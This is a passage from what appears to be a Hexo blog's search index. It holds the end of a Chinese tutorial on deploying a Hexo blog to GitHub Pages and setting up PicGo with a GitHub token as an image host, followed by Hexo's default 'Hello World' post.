class="headerlink" title="2.3. 更换主题"></a>2.3. 更换主题</h2><h1 id="3-博客部署"><a href="#3-博客部署" class="headerlink" title="3. 博客部署"></a>3. 博客部署</h1><p>登录 GitHub，新建一个 Repository，<code>Repository name</code>一定要是<code>yourusername</code>.github.io，</p><p>打开博客目录下的<code>_config.yml</code>，拉到最后，填写<code>deploy</code>模块：<code>repository</code> 填写Github仓库的链接</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span> </span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:yourusername/yourusername.github.io.git</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><p>现在可以将博客部署上去了，执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo d  <span class="comment"># hexo d 表示执行部署</span></span><br></pre></td></tr></table></figure><p>执行成功可以通过 <code>yourusername</code>.github.io 来访问博客了，至此搭建博客并部署已全部完成。</p><h1 id="4-图床"><a href="#4-图床" class="headerlink" title="4. 图床"></a>4. 图床</h1><blockquote><p>该部分转载自：<a href="https://blog.csdn.net/zyq55917/article/details/125182027">https://blog.csdn.net/zyq55917/article/details/125182027</a></p></blockquote><p>Hexo 博客站点搭建完成之后，需要考虑如何在文章中添加图片或视频。创建图床的目的是为本地图片等资源生成一个超链，然后将此连接嵌入到 markdown 编写的博客文章中，以此来解决博客中图片等资源的显示问题。</p><h2 id="4-1-下载-PicGo"><a href="#4-1-下载-PicGo" class="headerlink" title="4.1. 下载 PicGo"></a>4.1. 下载 PicGo</h2><p>PicGo 是一款图片上传的工具，目前支持 SM.SM图床、微博图床，七牛图床，腾讯云COS，阿里云OSS，又拍云，Github 等图床，未来将支持更多图床。<br>点击 <a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a> 下载 PicGo 工具。根据操作系统选择对应的版本，安装到指定目录。</p><p>PicGo官方文档：<a href="https://picgo.github.io/PicGo-Doc/zh/guide/#picgo-is-here">https://picgo.github.io/PicGo-Doc/zh/guide/#picgo-is-here</a></p><h2 id="4-2-创建-Github-仓库"><a href="#4-2-创建-Github-仓库" class="headerlink" title="4.2. 创建 Github 仓库"></a>4.2. 创建 Github 仓库</h2><p>在新建仓库页面，填入仓库名称，如 <code>resources</code>，名称可以随意填写。仓库类型选择 <code>public</code>。</p><p>如果已有仓库，跳过这一步。</p><h2 id="4-3-生成-Github-Token"><a href="#4-3-生成-Github-Token" class="headerlink" title="4.3. 生成 Github Token"></a>4.3. 生成 Github Token</h2><ul><li>点击右上角的头像， 选择 Settings 进入设置页面。</li><li>在打开的页面中， 点击 Developer settings 设置页面。</li><li>进入到权限设置的页面中， 这里选择使用 Personal access tokens。</li><li>并点击 Generate new token 生成一个新的 token。</li><li>填写一个描述信息， 用于我们区分 token 主要是用于做什么， 多个不同的授权码最好分开使用。 这样即使泄露也只是这一个库。勾选 repo 选项， 点击 Generate token 生成授权码。</li><li>token 有时间限制，过了有效期后需要重新生成。</li><li>记住这个授权码， 关闭页面就没有了， 只能重新生成了</li></ul><h2 id="4-4-图床信息"><a href="#4-4-图床信息" class="headerlink" title="4.4. 图床信息"></a>4.4. 图床信息</h2><ul><li>设定仓库名： 根据你刚刚创建的仓库加上你的用户名.</li><li>设定分支： 这里使用主分支 main。</li><li>设定Token：这里就是我们刚刚生成的授权码 token， 复制到这里即可。</li><li>存储路径：这里就是你的图片实际存放的地址，可以自己定义。这里使用 images&#x2F;。</li></ul><h2 id="4-5-图床测试"><a href="#4-5-图床测试" class="headerlink" title="4.5. 图床测试"></a>4.5. 图床测试</h2><p>上传一个图片进行测试。在上传区拖入一张图片。 然后就可以看到系统提示上传成功。</p><p>然后点击相册，可以看到我们刚刚上传的图片。</p><p>经过测试， 如果两个相同的文件上传， 第二次就会上传失败。</p><h2 id="4-6-配置-Markdown"><a href="#4-6-配置-Markdown" class="headerlink" title="4.6. 配置 Markdown"></a>4.6. 配置 Markdown</h2><h3 id="4-6-1-插入图片"><a href="#4-6-1-插入图片" class="headerlink" title="4.6.1. 插入图片"></a>4.6.1. 插入图片</h3><p>本文使用 Typora 工具。在 “格式” 菜单中选择 “图像”，插入图像元素。<br>在图片路径中填入从 PicGo 中复制的图片链接。</p><h3 id="4-6-2-插入视频"><a href="#4-6-2-插入视频" class="headerlink" title="4.6.2. 插入视频"></a>4.6.2. 插入视频</h3><p>以 B 站为例，在分享界面中复制嵌入代码。粘贴到 Markdown 文件中。</p><p>得到如下代码段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?isOutside=true&amp;aid=113629097689624&amp;bvid=BV13qqkYuEGo&amp;cid=27276019315&amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>直接嵌入后的视频窗口高度太小，我们调整如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">height=&quot;500&quot;</span><br></pre></td></tr></table></figure><p>调整后的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;//player.bilibili.com/player.html?isOutside=true&amp;aid=113629097689624&amp;bvid=BV13qqkYuEGo&amp;cid=27276019315&amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; height=&quot;500&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113629097689624&bvid=BV13qqkYuEGo&cid=27276019315&p=1" scrolling="no" border="0" frameborder="no" framespacing="0" height="500" allowfullscreen="true"></iframe><h3 id="4-6-3-更新内容"><a href="#4-6-3-更新内容" class="headerlink" title="4.6.3. 更新内容"></a>4.6.3. 更新内容</h3><p>在站点根目录下执行以下命令将站点内容更新到 Github Pages</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo c</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>执行完成后，稍等片刻，打开站点就可以看到了。</p><blockquote><p>以上部分转载自：[<a href="https://blog.csdn.net/zyq55917/article/details/125182027]">https://blog.csdn.net/zyq55917/article/details/125182027]</a></p></blockquote><h1 id="5-体会"><a href="#5-体会" class="headerlink" title="5. 体会"></a>5. 体会</h1><p>一定一定一定要会看官方文档！</p><p>在建站的过程中，出现了各种问题，搜了各种别人写的博客资料，都很难解决问题。最后仔细看了看官方文档，发现官方文档内写的很清楚，问题也得到了很好的解决。看官方文档是解决问题的最佳方式。</p><p><strong>另附：</strong></p><p>hexo官方文档：<a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><p>butterfly主题官方文档：<a href="https://butterfly.js.org/">https://butterfly.js.org/</a></p><p>参考博客：<a href="https://blog.csdn.net/clearloe/article/details/139879493">https://blog.csdn.net/clearloe/article/details/139879493</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
          <category> Hexo建站 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/blog/2025/01/15/%E5%85%B6%E4%BB%96/hello-world/"/>
      <url>/blog/2025/01/15/%E5%85%B6%E4%BB%96/hello-world/</url>
      
        <content type="html"><![CDATA[<hr><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
